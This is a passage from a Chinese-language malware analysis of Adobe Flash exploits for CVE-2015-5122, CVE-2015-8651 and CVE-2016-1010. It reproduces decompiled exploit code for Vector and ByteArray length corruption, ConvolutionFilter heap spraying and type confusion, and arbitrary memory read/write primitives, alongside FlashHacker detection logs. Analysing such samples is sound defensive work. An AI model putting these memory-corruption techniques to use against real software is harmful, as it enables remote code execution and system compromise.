          while (i  (_vLen + 0x02))
      {
        Log(((("ar[" + i) + "].length = ") + Hex(_vu.length)));
        Log(((((("ar[" + i) + "][") + Hex(_vLen)) + "] = ") + Hex(_vu[_vLen])));
        if (_vu[_vLen] == _vLen)
        {
          _vu[_vLen] = LEN40; // Corrupt _vu[_vLen+0x02].length to LEN40 (0x40000000)
          _vu = _ar[_vu[(_vLen + 0x02)]]; // _vu now points to corrupt Vector element
          break;
        };
      };
      i = (i + 1);
    };
图11 查找corrupt后的Vector元素
此过程中FlashHacker的日志信息如下所示，可以看到Vector.\.length字段被置成了0x40000000。
    * Detection: Setting valueOf: Object=Object Function=valueOf2
    * Setting property: MyClass.prototype.valueOf
    Object Name: MyClass.prototype
    Object Type: Object
    Property: valueOf
    Location: MyClass32/class/TryExpl
    builtin.as$0::MethodClosure
     function Function() {}
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: Vector Corruption
    Corrupt Vector..length: 0x40000000 at MyClass32/class/TryExpl L239 [0x3FFFFF9A]=0x6A->0x62 Maximum Vector..length:328  Count: 1 Maximum length:46
    Writing __AS3__.vec::Vector.[0x3FFE6629]=0xAC84EE0->0xA44B348 Maximum Vector..length:328
    Location: MyClass32/class/Set (L20)
    Writing __AS3__.vec::Vector.[0x3FFE662A]=0xAE76041->0x9C Maximum Vector..length:328
    Location: MyClass32/class/Set (L20)
图12 Vector结构corrupt过程中的FlashHacker日志
#### 2.2 ByteArray结构的corruption
在代号为DUBNIUM的行动中，我们发现CVE-2015-8651的利用样本通过对ByteArray.length字段的corruption来实现RW
primitives，此技术是为了绕过Vector的长度保护而引入的。
    _local_4 = 0x8012002C;
    si32(0x7FFFFFFF, (_local_4 + 0x7FFFFFFC)); // Out-of-bounds write with si32 upon ByteArray.length location at _local_4 + 0x7FFFFFFC with value of 0x7FFFFFFF
图13 通过si32指令对ByteArray.length字段进行corrupt
在完成ByteArray.length字段的corrupt后，我们还需要找到受影响的那个ByteArrays元素。
    _local_10 = 0x00;
    while (_local_10  0x10) // Check if ByteArray.length is corrupt
      {
        cbIndex = _local_10; // Index of corrupt ByteArray element in the bc array
      }
      else
      {
        bc[_local_10] = null;
      };
      _local_10++;
    };
图14 确定受影响的ByteArray元素
下面给出的是此exploit提供的各个RW primitives方法，基本上能支持各个操作系统中的目标程序。
    public function read32(destAddr:Number, modeAbs:Boolean=true):Number
    private function read32x86(destAddr:int, modeAbs:Boolean):uint
    private function read32x64(destAddr:Number, modeAbs:Boolean):uint
    public function readInt(u1:int, u2:int, mod:uint):int
    public function read64(destAddr:Number, modeAbs:Boolean=true):Number
    private function read64x86(destAddr:int, modeAbs:Boolean):Number
    private function read64x64(destAddr:Number, modeAbs:Boolean):Number
    public function readBytes(destAddr:Number, nRead:uint, modeAbs:Boolean=true):ByteArray
    private function readBytesx86(destAddr:uint, nRead:uint, modeAbs:Boolean):ByteArray
    private function readBytesx64(destAddr:Number, nRead:uint, modeAbs:Boolean):ByteArray
    public function write32(destAddr:Number, value:uint, modeAbs:Boolean=true):Boolean
    private function write32x86(destAddr:int, value:uint, modeAbs:Boolean=true):Boolean
    private function write32x64(destAddr:Number, value:uint, modeAbs:Boolean=true):Boolean
    public function write64(destAddr:Number, value:Number, modeAbs:Boolean=true):Boolean
    private function write64x86(destAddr:uint, value:Number, modeAbs:Boolean):Boolean
    private function write64x64(destAddr:Number, value:Number, modeAbs:Boolean):Boolean
    public function writeBytes(destAddr:Number, baWrite:ByteArray, modeAbs:Boolean=true):ByteArray
    private function writeBytesx86(destAddr:uint, ba:ByteArray, modeAbs:Boolean):ByteArray
    private function writeBytesx64(destAddr:Number, ba:ByteArray, modeAbs:Boolean):ByteArray
图15 RW primitives方法
例如，read32x86方法可用于读取x86平台上任意进程空间的内容。其中，cbIndex变量是bc数组的索引，该数组为ByteArray类型，同时，bc[cbIndex]对应的正是那个corrupt后的ByteArray元素。首先需要通过position成员来设置目标地址，之后便可以使用readUnsignedInt方法读取此内存值。
    private function read32x86(destAddr:int, modeAbs:Boolean):uint
    {
      var _local_3:int;
      if (((isMitisSE) || (isMitisSE9)))
      {
        bc[cbIndex].position = destAddr;
        bc[cbIndex].endian = "littleEndian";
        return (bc[cbIndex].readUnsignedInt());
      };
图16 Read primitive方法
write32x86方法也是相同的道理，它借助writeUnsignedInt来实现任意内存的写入操作。
    private function write32x86(destAddr:int, value:uint, modeAbs:Boolean=true):Boolean
    {
      if (((isMitisSE) || (isMitisSE9)))
      {
        bc[cbIndex].position = destAddr;
        bc[cbIndex].endian = "littleEndian";
        return (bc[cbIndex].writeUnsignedInt(value));
      };
图17 Write primitive方法
基于这些，exploit也就能够完成一些更复杂的操作了，例如可以借助readBytes方法实现多个字节的读取。
    private function readBytesx86(destAddr:uint, nRead:uint, modeAbs:Boolean):ByteArray
    {
      var _local_4:ByteArray = new ByteArray();
      var _local_5:uint = read32(rwableBAPoiAddr);
      write32(rwableBAPoiAddr, destAddr);
      var _local_6:uint;
      if (nRead > 0x1000)
      {
        _local_6 = read32((rwableBAPoiAddr + 0x08));
        write32((rwableBAPoiAddr + 0x08), nRead);
      };
      rwableBA.position = 0x00;
      try
      {
        rwableBA.readBytes(_local_4, 0x00, nRead);
      }
图18 读取单个字节
#### 2.3 ConvolutionFilter.matrix和tabStops的类型混淆
CVE-2016-1010这个堆溢出漏洞存在于BitMapData.copyPixel方法中，相应exploit中用到的RW
primitives是很有意思的，值得注意的是这些RW primitives功能将用于实现ByteArray对象的RW
primitives，后面的内存读写也主要借助这个corrupt后的ByteArray对象。因此，最开始实现的RW
primitives功能只起到了一个临时的作用，由之实现的ByteArray对象上的RW
primitives功能才是主要的，因为就编程来说操作ByteArray对象会显得更直观些。
实现RW primitives功能的第一步为执行Convolutionfilter对象的喷射操作。
    public function SprayConvolutionFilter():void
    {
      var _local_2:int;
      hhj234kkwr134 = new ConvolutionFilter(defaultMatrixX, 1);
      mnmb43 = new ConvolutionFilter(defaultMatrixX, 1);
      hgfhgfhfg3454331 = new ConvolutionFilter(defaultMatrixX, 1);
      var _local_1:int;
      while (_local_1 < 0x0100)
      {
        _local_2 = _local_1++;
        ConvolutionFilterArray[_local_2] = new ConvolutionFilter(defaultMatrixX, 1); // heap spraying ConvolutionFilter objects
      };
    }
接着由copyPixels方法触发此漏洞后，exploit会通过调用TypeConfuseConvolutionFilter方法来创建一个类型混淆的ConvolutionFilter对象。
    public function TriggerVulnerability():Boolean
    {
      var _local_9:int;
      var sourceBitmapData:BitmapData = new BitmapData(1, 1, true, 0xFF000001); // fill color is FF000001
      var sourceRect:Rectangle = new Rectangle(-880, -2, 0x4000000E, 8);
      var destPoint:Point = new Point(0, 0);
      var _local_4:TextFormat = new TextFormat();
      _local_4.tabStops = [4, 4];
      ...
      _local_1.copyPixels(sourceBitmapData, sourceRect, destPoint);
      if (!(TypeConfuseConvolutionFilter()))
      {
        return (false);
      };
图19 在TriggerVulnerability中调用TypeConfuseConvolutionFilter
对于TypeConfuseConvolutionFilter函数，它将借助DWORD值0x55667788来标识corrupt后的内存区域，并借此定位堆喷对象中那个类型混淆的ConvolutionFilter元素。
    public function TypeConfuseConvolutionFilter():Boolean
    {
      ...
      while (_local_3 < 0x0100)
      {
        _local_4 = _local_3++;
        ConvolutionFilterArray[_local_4].matrixY = kkkk2222222;
        ConvolutionFilterArray[_local_4].matrix = _local_2;
      };
      ...
      _local_5 = gfhfghsdf22432.ghfg43[bczzzzz].matrix;
      _local_5[0] = jjj3.IntToNumber(0x55667788); // Corrupt memory
      gfhfghsdf22432.ghfg43[bczzzzz].matrix = _local_5;
      ConfusedConvolutionFilterIndex = -1;
      _local_3 = 0;
      while (((ConfusedConvolutionFilterIndex == (-1)) && ((_local_3 < ConvolutionFilterArray.length))))
      {
        matrix = ConvolutionFilterArray[_local_3].matrix;
        _local_4 = 0;
        _local_6 = _local_9.length;
        while (_local_4 < _local_6)
        {
          _local_7 = _local_4++;
          if ((jjj3.NumberToDword(matrix[_local_7]) == 0x55667788)) // Locate type-confused ConvolutionFilter object
          {
            ConfusedConvolutionFilterIndex = _local_3;
            break;